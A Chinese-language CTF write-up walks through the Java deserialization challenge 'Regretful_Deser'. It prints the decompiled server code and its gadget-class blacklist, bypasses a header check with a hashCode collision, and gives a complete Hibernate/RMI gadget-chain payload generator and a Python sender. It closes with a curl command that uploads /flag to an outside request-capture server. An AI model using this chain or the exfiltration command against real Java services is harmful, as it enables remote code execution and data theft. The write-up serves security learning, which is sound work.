---
title: "ISCTFjava反序列化复现"
image: ''
pinned: false
comment: true
published: 2025-12-08
description: "CTF 学习笔记与技术复盘"
category: 学习
tags: [学习]
---

应某个学长的强烈要求，才写的，你好。

# #题目名：Regretful_Deser

我不想说，其实，还没做到这一题就已经有所耳闻，java反序列化。

要说我会，那当然是不会了，所以这篇文章就只是边做边学的笔记。

![alt text](/images/QQ20251209-162949.png)

给了个靶机加java源码，其实有点像靶场的"Java Developer" (1)，点靶机进去是完全没有信息，只能靠自己搜集。

但靶场那题还是远没有这题bt的。

这题的原理就是java反序列化。

![alt text](/images/QQ20251209-163244.png)

这边贴一下什么叫反序列化。

我目前见到的反序列化的web题基本都是php代码的，所以这是第一次做到java的反序列化。

简单来讲，java程序在传输中会将存放在内存的对象转化为字节流，再发送。而我们要做的就是写出我们需要对象的字节流。

对象包含属性和方法。

java程序在组装对象时，就会自动调用对象的方法，然后去执行里面的内容。

接下来，上源码。

![alt text](/images/QQ20251209-164529.png)

好吧，其实是不可能一个一个贴出来的，这边运用的程序叫jadx，因为题目给我们的是jar文件，我们直接看是看不懂的，那是给计算机看的，我们需要将jar里面的内容反编译成我们能看的内容，这个程序就是反编译java用的，re的装备。

> package org.example;
>
> import com.sun.net.httpserver.HttpExchange;
> import com.sun.net.httpserver.HttpHandler;
> import com.sun.net.httpserver.HttpServer;
> import com.sun.xml.fastinfoset.EncodingConstants;
> import java.io.BufferedReader;
> import java.io.ByteArrayInputStream;
> import java.io.IOException;
> import java.io.InputStream;
> import java.io.InputStreamReader;
> import java.io.OutputStream;
> import java.io.UnsupportedEncodingException;
> import java.net.InetSocketAddress;
> import java.net.URI;
> import java.net.URLDecoder;
> import java.nio.charset.StandardCharsets;
> import java.util.Base64;
> import java.util.HashMap;
> import java.util.List;
> import java.util.Map;
> import java.util.concurrent.Executor;
>
> /* loaded from: n1ght_web-1.0-SNAPSHOT-jar-with-dependencies.jar:org/example/Main.class */
> public class Main {
>     public static void main(String[] args) throws Exception {
>         HttpServer server = HttpServer.create(new InetSocketAddress(8080), 0);
>         server.createContext("/", new IndexHandler());
>         server.createContext("/hello", new HelloHandler());
>         server.createContext("/api/echo", new EchoHandler());
>         server.setExecutor((Executor) null);
>         System.out.println("Server started at http://localhost:8080");
>         server.start();
>     }
>
> package org.example;
>
> import com.sun.net.httpserver.HttpExchange;
> import com.sun.net.httpserver.HttpHandler;
> import com.sun.net.httpserver.HttpServer;
> import com.sun.xml.fastinfoset.EncodingConstants;
> import java.io.BufferedReader;
> import java.io.ByteArrayInputStream;
> import java.io.IOException;
> import java.io.InputStream;
> import java.io.InputStreamReader;
> import java.io.OutputStream;
> import java.io.UnsupportedEncodingException;
> import java.net.InetSocketAddress;
> import java.net.URI;
> import java.net.URLDecoder;
> import java.nio.charset.StandardCharsets;
> import java.util.Base64;
> import java.util.HashMap;
> import java.util.List;
> import java.util.Map;
> import java.util.concurrent.Executor;
>
> /* loaded from: n1ght_web-1.0-SNAPSHOT-jar-with-dependencies.jar:org/example/Main.class */
> public class Main {
>     public static void main(String[] args) throws Exception {
>         HttpServer server = HttpServer.create(new InetSocketAddress(8080), 0);
>         server.createContext("/", new IndexHandler());
>         server.createContext("/hello", new HelloHandler());
>         server.createContext("/api/echo", new EchoHandler());
>         server.setExecutor((Executor) null);
>         System.out.println("Server started at http://localhost:8080");
>         server.start();
>     }
>
> /* loaded from: n1ght_web-1.0-SNAPSHOT-jar-with-dependencies.jar:org/example/Main$IndexHandler.class */
> static class IndexHandler implements HttpHandler {
>     IndexHandler() {
>     }
>
> public void handle(HttpExchange exchange) throws IOException {
>     String method = exchange.getRequestMethod();
>     if (!"GET".equalsIgnoreCase(method)) {
>         Main.sendText(exchange, 405, "Method Not Allowed");
>     } else {
>         Main.sendHtml(exchange, EncodingConstants.UNEXPANDED_ENTITY_REFERENCE, "hello index");
>     }
> }
>
> }
>
> /* loaded from: n1ght_web-1.0-SNAPSHOT-jar-with-dependencies.jar:org/example/Main$HelloHandler.class */
> static class HelloHandler implements HttpHandler {
>     HelloHandler() {
>     }
>
> public void handle(HttpExchange exchange) throws IOException {
>     if (!"GET".equalsIgnoreCase(exchange.getRequestMethod())) {
>         Main.sendText(exchange, 405, "Method Not Allowed");
>         return;
>     }
>     URI uri = exchange.getRequestURI();
>     Map<String, String> queryParams = Main.parseQuery(uri.getRawQuery());
>     String name = queryParams.getOrDefault("name", "World");
>     String response = "Hello, " + name + "!";
>     Main.sendText(exchange, EncodingConstants.UNEXPANDED_ENTITY_REFERENCE, response);
> }
>
> }
>
> /* loaded from: n1ght_web-1.0-SNAPSHOT-jar-with-dependencies.jar:org/example/Main$EchoHandler.class */
> static class EchoHandler implements HttpHandler {
>     EchoHandler() {
>     }
>
> public void handle(HttpExchange exchange) throws IOException {
>     List<String> cookie = exchange.getRequestHeaders().get("Pass");
>     String pass = cookie.get(0);
>     if (!pass.equals("n1ght") && pass.hashCode() == "n1ght".hashCode()) {
>         List<String> echo = exchange.getRequestHeaders().get("echo");
>         String s = echo.get(0);
>         byte[] decode = Base64.getDecoder().decode(s);
>         try {
>             new SecurityObjectInputStream(new ByteArrayInputStream(decode)).readObject();
>         } catch (ClassNotFoundException e) {
>             throw new RuntimeException(e);
>         }
>     }
> }
>
> }
>
> /* JADX INFO: Access modifiers changed from: private */
> public static void sendText(HttpExchange exchange, int statusCode, String text) throws IOException {
>     byte[] bytes = text.getBytes(StandardCharsets.UTF_8);
>     exchange.getResponseHeaders().set("Content-Type", "text/plain; charset=utf-8");
>     exchange.sendResponseHeaders(statusCode, bytes.length);
>     OutputStream os = exchange.getResponseBody();
>     Throwable th = null;
>     try {
>         try {
>             os.write(bytes);
>             if (os != null) {
>                 if (0 != 0) {
>                     try {
>                         os.close();
>                         return;
>                     } catch (Throwable th2) {
>                         th.addSuppressed(th2);
>                         return;
>                     }
>                 }
>                 os.close();
>             }
>         } catch (Throwable th3) {
>             th = th3;
>             throw th3;
>         }
>     } catch (Throwable th4) {
>         if (os != null) {
>             if (th != null) {
>                 try {
>                     os.close();
>                 } catch (Throwable th5) {
>                     th.addSuppressed(th5);
>                 }
>             } else {
>                 os.close();
>             }
>         }
>         throw th4;
>     }
> }
>
> /* JADX INFO: Access modifiers changed from: private */
> public static void sendHtml(HttpExchange exchange, int statusCode, String html) throws IOException {
>     byte[] bytes = html.getBytes(StandardCharsets.UTF_8);
>     exchange.getResponseHeaders().set("Content-Type", "text/html; charset=utf-8");
>     exchange.sendResponseHeaders(statusCode, bytes.length);
>     OutputStream os = exchange.getResponseBody();
>     Throwable th = null;
>     try {
>         try {
>             os.write(bytes);
>             if (os != null) {
>                 if (0 != 0) {
>                     try {
>                         os.close();
>                         return;
>                     } catch (Throwable th2) {
>                         th.addSuppressed(th2);
>                         return;
>                     }
>                 }
>                 os.close();
>             }
>         } catch (Throwable th3) {
>             th = th3;
>             throw th3;
>         }
>     } catch (Throwable th4) {
>         if (os != null) {
>             if (th != null) {
>                 try {
>                     os.close();
>                 } catch (Throwable th5) {
>                     th.addSuppressed(th5);
>                 }
>             } else {
>                 os.close();
>             }
>         }
>         throw th4;
>     }
> }
>
> /* JADX WARN: Failed to apply debug info
> java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.InsnArg.getType()" because "changeArg" is null
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.moveListener(TypeUpdate.java:439)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.runListeners(TypeUpdate.java:232)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.requestUpdate(TypeUpdate.java:212)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeForSsaVar(TypeUpdate.java:183)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeChecked(TypeUpdate.java:112)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:83)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.applyWithWiderIgnoreUnknown(TypeUpdate.java:74)
>     at jadx.core.dex.visitors.debuginfo.DebugInfoApplyVisitor.applyDebugInfo(DebugInfoApplyVisitor.java:137)
>     at jadx.core.dex.visitors.debuginfo.DebugInfoApplyVisitor.applyDebugInfo(DebugInfoApplyVisitor.java:133)
>     at jadx.core.dex.visitors.debuginfo.DebugInfoApplyVisitor.searchAndApplyVarDebugInfo(DebugInfoApplyVisitor.java:75)
>     at jadx.core.dex.visitors.debuginfo.DebugInfoApplyVisitor.lambda$applyDebugInfo$0(DebugInfoApplyVisitor.java:68)
>     at java.base/java.util.ArrayList.forEach(Unknown Source)
>     at jadx.core.dex.visitors.debuginfo.DebugInfoApplyVisitor.applyDebugInfo(DebugInfoApplyVisitor.java:68)
>     at jadx.core.dex.visitors.debuginfo.DebugInfoApplyVisitor.visit(DebugInfoApplyVisitor.java:55)
>  */
> /* JADX WARN: Failed to calculate best type for var: r8v0 ??
> java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.InsnArg.getType()" because "changeArg" is null
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.moveListener(TypeUpdate.java:439)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.runListeners(TypeUpdate.java:232)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.requestUpdate(TypeUpdate.java:212)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeForSsaVar(TypeUpdate.java:183)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeChecked(TypeUpdate.java:112)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:83)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:56)
>     at jadx.core.dex.visitors.typeinference.FixTypesVisitor.calculateFromBounds(FixTypesVisitor.java:156)
>     at jadx.core.dex.visitors.typeinference.FixTypesVisitor.setBestType(FixTypesVisitor.java:133)
>     at jadx.core.dex.visitors.typeinference.FixTypesVisitor.deduceType(FixTypesVisitor.java:238)
>     at jadx.core.dex.visitors.typeinference.FixTypesVisitor.tryDeduceTypes(FixTypesVisitor.java:221)
>     at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:91)
>  */
> /* JADX WARN: Failed to calculate best type for var: r8v0 ??
> java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.InsnArg.getType()" because "changeArg" is null
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.moveListener(TypeUpdate.java:439)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.runListeners(TypeUpdate.java:232)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.requestUpdate(TypeUpdate.java:212)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeForSsaVar(TypeUpdate.java:183)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeChecked(TypeUpdate.java:112)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:83)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:56)
>     at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.calculateFromBounds(TypeInferenceVisitor.java:145)
>     at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.setBestType(TypeInferenceVisitor.java:123)
>     at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.lambda$runTypePropagation$1(TypeInferenceVisitor.java:101)
>     at java.base/java.util.ArrayList.forEach(Unknown Source)
>     at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.runTypePropagation(TypeInferenceVisitor.java:101)
>     at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.visit(TypeInferenceVisitor.java:75)
>  */
> /* JADX WARN: Failed to calculate best type for var: r9v0 ??
> java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.InsnArg.getType()" because "changeArg" is null
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.moveListener(TypeUpdate.java:439)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.runListeners(TypeUpdate.java:232)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.requestUpdate(TypeUpdate.java:212)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeForSsaVar(TypeUpdate.java:183)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeChecked(TypeUpdate.java:112)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:83)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:56)
>     at jadx.core.dex.visitors.typeinference.FixTypesVisitor.calculateFromBounds(FixTypesVisitor.java:156)
>     at jadx.core.dex.visitors.typeinference.FixTypesVisitor.setBestType(FixTypesVisitor.java:133)
>     at jadx.core.dex.visitors.typeinference.FixTypesVisitor.deduceType(FixTypesVisitor.java:238)
>     at jadx.core.dex.visitors.typeinference.FixTypesVisitor.tryDeduceTypes(FixTypesVisitor.java:221)
>     at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:91)
>  */
> /* JADX WARN: Failed to calculate best type for var: r9v0 ??
> java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.InsnArg.getType()" because "changeArg" is null
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.moveListener(TypeUpdate.java:439)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.runListeners(TypeUpdate.java:232)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.requestUpdate(TypeUpdate.java:212)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeForSsaVar(TypeUpdate.java:183)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeChecked(TypeUpdate.java:112)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:83)
>     at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:56)
>     at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.calculateFromBounds(TypeInferenceVisitor.java:145)
>     at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.setBestType(TypeInferenceVisitor.java:123)
>     at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.lambda$runTypePropagation$1(TypeInferenceVisitor.java:101)
>     at java.base/java.util.ArrayList.forEach(Unknown Source)
>     at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.runTypePropagation(TypeInferenceVisitor.java:101)
>     at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.visit(TypeInferenceVisitor.java:75)
>  */
> /* JADX WARN: Multi-variable type inference failed. Error: java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.RegisterArg.getSVar()" because the return value of "jadx.core.dex.nodes.InsnNode.getResult()" is null
>     at jadx.core.dex.visitors.typeinference.AbstractTypeConstraint.collectRelatedVars(AbstractTypeConstraint.java:31)
>     at jadx.core.dex.visitors.typeinference.AbstractTypeConstraint.<init>(AbstractTypeConstraint.java:19)
>     at jadx.core.dex.visitors.typeinference.TypeSearch$1.<init>(TypeSearch.java:376)
>     at jadx.core.dex.visitors.typeinference.TypeSearch.makeMoveConstraint(TypeSearch.java:376)
>     at jadx.core.dex.visitors.typeinference.TypeSearch.makeConstraint(TypeSearch.java:361)
>     at jadx.core.dex.visitors.typeinference.TypeSearch.collectConstraints(TypeSearch.java:341)
>     at java.base/java.util.ArrayList.forEach(Unknown Source)
>     at jadx.core.dex.visitors.typeinference.TypeSearch.run(TypeSearch.java:60)
>     at jadx.core.dex.visitors.typeinference.FixTypesVisitor.runMultiVariableSearch(FixTypesVisitor.java:116)
>     at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:91)
>  */
> /* JADX WARN: Not initialized variable reg: 8, insn: 0x00e9: MOVE (r0 I:??[int, float, boolean, short, byte, char, OBJECT, ARRAY]) = (r8 I:??[int, float, boolean, short, byte, char, OBJECT, ARRAY] A[D('isr' java.io.InputStreamReader)]) A[TRY_LEAVE], block:B:53:0x00e9 */
> /* JADX WARN: Not initialized variable reg: 9, insn: 0x00ed: MOVE (r0 I:??[int, float, boolean, short, byte, char, OBJECT, ARRAY]) = (r9 I:??[int, float, boolean, short, byte, char, OBJECT, ARRAY]), block:B:55:0x00ed */
> /* JADX WARN: Type inference failed for: r8v0, names: [isr], types: [java.io.InputStreamReader] */
> /* JADX WARN: Type inference failed for: r9v0, types: [java.lang.Throwable] */
> private static String readBody(HttpExchange exchange) throws IOException {
>     ?? r8;
>     ?? r9;
>     InputStream is = exchange.getRequestBody();
>     Throwable th = null;
>     try {
>         try {
>             InputStreamReader inputStreamReader = new InputStreamReader(is, StandardCharsets.UTF_8);
>             Throwable th2 = null;
>             BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
>             Throwable th3 = null;
>             try {
>                 try {
>                     StringBuilder sb = new StringBuilder();
>                     while (true) {
>                         String line = bufferedReader.readLine();
>                         if (line == null) {
>                             break;
>                         }
>                         sb.append(line);
>                     }
>                     String string = sb.toString();
>                     if (bufferedReader != null) {
>                         if (0 != 0) {
>                             try {
>                                 bufferedReader.close();
>                             } catch (Throwable th4) {
>                                 th3.addSuppressed(th4);
>                             }
>                         } else {
>                             bufferedReader.close();
>                         }
>                     }
>                     if (inputStreamReader != null) {
>                         if (0 != 0) {
>                             try {
>                                 inputStreamReader.close();
>                             } catch (Throwable th5) {
>                                 th2.addSuppressed(th5);
>                             }
>                         } else {
>                             inputStreamReader.close();
>                         }
>                     }
>                     return string;
>                 } catch (Throwable th6) {
>                     if (bufferedReader != null) {
>                         if (th3 != null) {
>                             try {
>                                 bufferedReader.close();
>                             } catch (Throwable th7) {
>                                 th3.addSuppressed(th7);
>                             }
>                         } else {
>                             bufferedReader.close();
>                         }
>                     }
>                     throw th6;
>                 }
>             } finally {
>             }
>         } catch (Throwable th8) {
>             if (r8 != 0) {
>                 if (r9 != 0) {
>                     try {
>                         r8.close();
>                     } catch (Throwable th9) {
>                         r9.addSuppressed(th9);
>                     }
>                 } else {
>                     r8.close();
>                 }
>             }
>             throw th8;
>         }
>     } finally {
>         if (is != null) {
>             if (0 != 0) {
>                 try {
>                     is.close();
>                 } catch (Throwable th10) {
>                     th.addSuppressed(th10);
>                 }
>             } else {
>                 is.close();
>             }
>         }
>     }
> }
>
> /* JADX INFO: Access modifiers changed from: private */
> public static Map<String, String> parseQuery(String query) throws UnsupportedEncodingException {
>     Map<String, String> result = new HashMap<>();
>     if (query == null || query.isEmpty()) {
>         return result;
>     }
>     String[] pairs = query.split("&");
>     for (String pair : pairs) {
>         int idx = pair.indexOf(61);
>         if (idx > 0 && idx < pair.length() - 1) {
>             String key = URLDecoder.decode(pair.substring(0, idx), String.valueOf(StandardCharsets.UTF_8));
>             String value = URLDecoder.decode(pair.substring(idx + 1), String.valueOf(StandardCharsets.UTF_8));
>             result.put(key, value);
>         } else if (idx == -1) {
>             String key2 = URLDecoder.decode(pair, String.valueOf(StandardCharsets.UTF_8));
>             result.put(key2, "");
>         }
>     }
>     return result;
> } 

![alt text](/images/QQ20251209-171408.png)

漏洞代码以及漏洞处。

这段代码分为了一个主类Main，三个处理类Handle。

![alt text](/images/QQ20251209-171750.png)

先看这里，代码设定了，如果你是GET，以传参的方式进入网站则返回hello index，如果不是就显示405.

![alt text](/images/QQ20251209-171950.png)

再看这里，这边其实挺容易懂的，要求我们带上Pass的数值，Pass的值不为n1ght，但它的哈希值必须为n1ght的哈希值。这边涉及到哈希碰撞。

通过了之后，服务器就会获得我们发送的base64码，然后转化为二进制byte[],最后将这段二进制流放入try{}中，可以看见其实代码里有一个SecurityObjectInputStream，这个我们可以去看源码。

```
package org.example;

import java.io.IOException;
import java.io.InputStream;
import java.io.InvalidClassException;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;

/* loaded from: n1ght_web-1.0-SNAPSHOT-jar-with-dependencies.jar:org/example/SecurityObjectInputStream.class */
public class SecurityObjectInputStream extends ObjectInputStream {
    public static String[] blacklist = {"org.apache.commons.collections", "javax.swing", "com.sun.rowset", "com.sun.org.apache.xalan", "java.security", "java.rmi.MarshalledObject", "javax.management.remote.rmi.RMIConnector"};

    public SecurityObjectInputStream(InputStream inputStream) throws IOException {
        super(inputStream);
    }

    @Override // java.io.ObjectInputStream
    protected Class resolveClass(ObjectStreamClass cls) throws IOException, ClassNotFoundException {
        if (!contains(cls.getName())) {
            return super.resolveClass(cls);
        }
        System.out.println("Unexpected serialized class" + cls.getName());
        throw new InvalidClassException("Unexpected serialized class", cls.getName());
    }

    public static boolean contains(String targetValue) {
        for (String forbiddenPackage : blacklist) {
            if (targetValue.contains(forbiddenPackage)) {
                return true;
            }
        }
        return false;
    }
}
```

这段代码设置了一个黑名单，禁用{"org.apache.commons.collections", "javax.swing", "com.sun.rowset", "com.sun.org.apache.xalan", "java.security", "java.rmi.MarshalledObject", "javax.management.remote.rmi.RMIConnector"}这些东西。其实我也看不懂这些东西是什么。

做个调查。

![alt text](/images/QQ20251209-173559.png)

用一下神秘小工具。

这些都是常见的java反序列链所用到的库。

这个安全检测就是看我们链中是否有这些库中的东西，如果有那我们的反序列链就被干掉了。

以上就是我们从源码中获得的信息，接下来，我们要开始构造攻击链。

> https://cina666.github.io/2025/03/10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHibernate/

引用一篇文章。

我们构造的payload是一个套娃型的结构。

**第一部分:**

Java

```
[cite_start]// [cite: 91-95]
String host = "服务器ip"; 
int port = 端口;                      
TCPEndpoint te = new TCPEndpoint(host, port);
UnicastRef ref = new UnicastRef(new LiveRef(id2, te, false));
...
ActivatableRef activatableRef = ...
```

- **TCPEndpoint**：这是一个底层的 Java RMI 类，它在肚子里存了两个关键数据：IP 和端口。序列化时，这两个字符串被写进了二进制流。(因为我们做的这套操作是让服务起远程操作，所以运用到了RMI)
- **ActivatableRef**：这是一个远程对象的引用。它的特性是：当有人调用它的 `getRef()` 方法时，它会尝试建立 TCP 连接。

**第二部分:**

Java

```
[cite_start]// [cite: 104, 112-116]
TypedValue typedValue = new TypedValue(componentType, activatableRef);
new GetterMethodImpl(Object.class, "qwq", c1.getDeclaredMethod("getRef"))
```

- **TypedValue**：这是 Hibernate 库里的一个类。它的设计初衷是封装一个值。它的hashCode()逻辑：TypedValue在计算哈希时，不会直接算，而是去调用内部持有对象的Getter 。

  ![alt text](/images/QQ20251209-181754.png)

- **Reflection**：反射修改`typevalue`中的Getter，修改为`ActivatableRef`的getRef().

**第三部分:**

Java

```
[cite_start]// [cite: 87, 118, 122, 129]
Hashtable hashtable = new Hashtable();
hashtable.put(1, 111);
Object[] table = (Object[]) tableField.get(hashtable);
setField(entry, "key", typedValue);
```

- 先放一个无害的数字 1。(避免生成payload的时候直接连接我们的电脑。)
- **setField**：待`hashtable`运行后,在替换掉1.
- **hashtable**：查询数据，决定数据的存放位置。

**第四部分：**

Java

```
[cite_start]// [cite: 131, 157]
String string = Base64.getEncoder().encodeToString(ser(hashtable));
```

- **ser**：`ser()` 方法内部调用了 `objectOutputStream.writeObject(o)`。



---



**过程：**

1. **序列化 **：遍历这个`Hashtable`。
   - 把 `Hashtable` 的结构写成二进制。
   - 有个 Key 是 `TypedValue`，把它也写成二进制。
   -  `TypedValue` 里包含 `ActivatableRef`，把它也写进去。
   - `ActivatableRef` 里包含 `6.tcp.vip.cpolar.cn`，把这串字符也写进去。
2. **Base64 编码**：Base64 把它变成了一串由 `a-z, A-Z, 0-9` 组成的字符串。

所以，最终生成payload的代码，如下：

```
import java.io.*;
import java.lang.reflect.*;
import java.rmi.server.ObjID;
import java.util.Base64;
import java.util.Hashtable;
import java.util.Random;
import sun.rmi.server.ActivatableRef;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import sun.reflect.ReflectionFactory;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.property.access.spi.Getter;
import org.hibernate.property.access.spi.GetterMethodImpl;
import org.hibernate.tuple.component.AbstractComponentTuplizer;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.ComponentType;

public class hibernate {

    // 1. 设置服务器，要是能跟ip相连的。
    public static String host = "6.tcp.vip.cpolar.cn"; 
    public static int port = 12176;

    public static void main(String[] args) throws Exception {

        Hashtable hashtable = new Hashtable();
        hashtable.put(1, 111); 

        // 连接我们的服务器。
        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        
        ActivatableRef activatableRef = (ActivatableRef) createWithoutConstructor(Class.forName("sun.rmi.server.ActivatableRef"));
        setField(activatableRef, "id", new java.rmi.activation.ActivationID(null));
        setField(activatableRef, "ref", ref);

        Class<?> componentTypeClass = ComponentType.class;
        ComponentType componentType = (ComponentType) createWithoutConstructor(componentTypeClass);
        
        GetterMethodImpl getter = new GetterMethodImpl(ActivatableRef.class, "qwq", ActivatableRef.class.getDeclaredMethod("getRef"));
        
        PojoComponentTuplizer tuplizer = (PojoComponentTuplizer) createWithoutConstructor(PojoComponentTuplizer.class);
        setField(tuplizer, "getters", new Getter[]{getter});
        
        setField(componentType, "componentTuplizer", tuplizer);
        setField(componentType, "propertySpan", 1);

        TypedValue typedValue = new TypedValue(componentType, null);
        setField(typedValue, "value", activatableRef);

        Field tableField = Hashtable.class.getDeclaredField("table");
        tableField.setAccessible(true);
        Object[] table = (Object[]) tableField.get(hashtable);
        
        for (Object entry : table) {
            if (entry == null) continue;
            Field keyField = entry.getClass().getDeclaredField("key");
            keyField.setAccessible(true);
            keyField.set(entry, typedValue);
        }

        // 结束攻击

        String base64String = Base64.getEncoder().encodeToString(serialize(hashtable));
        System.out.println("\n===== 复制下面的 Base64 Payload =====");
        System.out.println(base64String);
        System.out.println("=====================================\n");
    }

    // 辅助工具方法

    public static Object createWithoutConstructor(Class clazz) throws Exception {
        ReflectionFactory rf = ReflectionFactory.getReflectionFactory();
        Constructor objDef = Object.class.getDeclaredConstructor();
        Constructor intConstr = rf.newConstructorForSerialization(clazz, objDef);
        return clazz.cast(intConstr.newInstance());
    }

    public static void setField(Object obj, String fieldName, Object value) throws Exception {
        Field field = getField(obj.getClass(), fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Field getField(Class<?> clazz, String fieldName) {
        try {
            return clazz.getDeclaredField(fieldName);
        } catch (NoSuchFieldException e) {
            if (clazz.getSuperclass() != null)
                return getField(clazz.getSuperclass(), fieldName);
        }
        return null;
    }

    public static byte[] serialize(Object o) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        return baos.toByteArray();
    }
}
```

运行这段java代码后，会生成一大段base64编码后的字符，正是反序列化内容。

接下来，就要准备东西了，我们上述的base64字节流反序列化后，起到的作用仅仅只是让题目的靶机tcp连上我们设定好的服务器，还是拿不到flag，我们需要让题目的靶机执行获取flag的指令。

这边用到了java chain，可以去github下载，然后直接部署在自己的本地上。

![alt text](/images/QQ20251209-185038.png)

第一步，发送我们的base64字节流。

```
import requests

# 1. 靶机地址 (题目重启后端口可能会变，请检查)
[cite_start]# [cite: 201]
url = "http://challenge.bluesharkinfo.com:23923/api/echo"

# 2. 通行证 (利用哈希碰撞绕过检查，固定值)
[cite_start]# [cite: 203]
pass_val = "n1giU"

# 3. 炸弹诱饵 (在这里粘贴你 Java 生成的那一大串 Base64)
[cite_start]# [cite: 206-232]
payload = "ase64字符串"

# 4. 包装信封 (设置请求头)
[cite_start]# [cite: 234-240]
headers = {
    "Pass": pass_val, 
    "echo": payload    
}

no_proxy = { "http": None, "https": None }

try:
    print(f"[-] 正在向 {url} 传输...")
    
    # 6. 发射请求 
    [cite_start]# [cite: 246-250]
    response = requests.get(
        url=url, 
        headers=headers, 
        proxies=no_proxy, 
        timeout=5         
    )
    
    print(f"[+] 请求发送完毕，状态码: {response.status_code}")
    print("[*] 成功！")

except Exception as e:

    print(f"[!] 发送报错 : {e}")
```

这个时候，题目的靶机就会执行操作，tcp连接我们设定的服务器。

我这边用的是Cpolar，在本地运行后，打通公网与内网的通道，创建一个口子。

利用这个口子，服务器靶机就会连接进来，然后访问我们的服务器，执行我们java chain上的指令。

但是单单这样还没有用，执行了获取flag的指令，那我怎么拿到呢，这个时候就需要一个临时服务器来接受靶机获取的flag。

`curl 临时服务器 -T /flag`

> https://requestrepo.com/

这边用的是这个。

最后用python发送完请求后，去临时服务器上看就收获了flag。

![alt text](/images/6C7F80F50AC376128618E4DEB1707C5A.png)

---

---

---

---

---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
